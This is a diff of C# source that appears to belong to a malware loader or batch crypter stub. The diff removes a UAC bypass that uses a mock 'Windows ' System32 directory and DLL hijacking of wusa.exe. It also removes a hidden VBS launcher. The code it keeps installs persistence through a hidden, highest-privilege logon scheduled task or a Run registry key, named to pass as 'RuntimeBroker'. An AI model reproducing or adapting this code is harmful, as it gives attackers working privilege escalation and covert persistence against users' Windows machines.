@@ -43,34 +43,6 @@ namespace namespace_name
         {
             string currentfilename = Process.GetCurrentProcess().MainModule.FileName;
 
-#if UAC_BYPASS
-            Version osversion = Environment.OSVersion.Version;
-            if ((osversion.Major >= 6 && osversion.Minor >= 1) || osversion.Major >= 10)
-            {
-                try
-                {
-                    if (!IsAdmin())
-                    {
-                        Directory.CreateDirectory("\\\\?\\C:\\Windows \\System32");
-                        File.Copy("C:\\Windows\\System32\\wusa.exe", "C:\\Windows \\System32\\wusa.exe", true);
-                        File.WriteAllBytes("C:\\Windows \\System32\\WTSAPI32.dll", uncompressfunction_name(getembeddedresourcefunction_name(@"UAC")));
-                        Process.Start(new ProcessStartInfo()
-                        {
-                            FileName = "C:\\Windows \\System32\\wusa.exe",
-                            Arguments = "\"" + Console.Title + "\"",
-                            UseShellExecute = true,
-                            WindowStyle = ProcessWindowStyle.Hidden
-                        });
-                        Environment.Exit(-1);
-                    }
-                    Directory.Delete("\\\\?\\C:\\Windows ", true);
-                }
-                catch
-                {
-                }
-            }
-#endif
-
 #if STARTUP
             try
             {
@@ -200,14 +172,12 @@ namespace namespace_name
             string currentfileextension = ".bat";
             string randomvar = new Random().Next(1, 1000).ToString();
             string newpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\startup_str_" + randomvar + currentfileextension;
-            string newVpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\startup_str_" + randomvar + @".vbs";
-            File.WriteAllText(newVpath, "CreateObject(Replace(\"WScript.Shell\",\"SubChar\",\"\")).Run \"\"\"" + newpath + "\"\"\", 0");
             if (IsAdmin())
             {
                 Process.Start(new ProcessStartInfo()
                 {
                     FileName = "powershell.exe",
-                    Arguments = "Register-ScheduledTask -TaskName 'RuntimeBroker_startup_" + randomvar + "_str' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '" + newVpath + "') -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -ExecutionTimeLimit 0) -RunLevel Highest -Force",
+                    Arguments = "Register-ScheduledTask -TaskName 'RuntimeBroker_startup_" + randomvar + "_str' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '" + newpath + "') -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -ExecutionTimeLimit 0) -RunLevel Highest -Force",
                     UseShellExecute = true,
                     WindowStyle = ProcessWindowStyle.Hidden
                 }).WaitForExit();
@@ -215,12 +185,12 @@ namespace namespace_name
             else
             {
                 var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-                key.SetValue("RuntimeBroker_startup_" + randomvar + @"_str", "wscript.exe \"" + newVpath + "\"");
+                key.SetValue("RuntimeBroker_startup_" + randomvar + @"_str", "cmd.exe /c \"" + newpath + "\"");
                 key.Dispose();
             }
             if (batPath.IndexOf(newpath, StringComparison.OrdinalIgnoreCase) == 0) return;
             File.Copy(batPath, newpath, true);
-            Process.Start(newVpath);
+            Process.Start(newpath);
             Environment.Exit(-1);
         }
 #endif
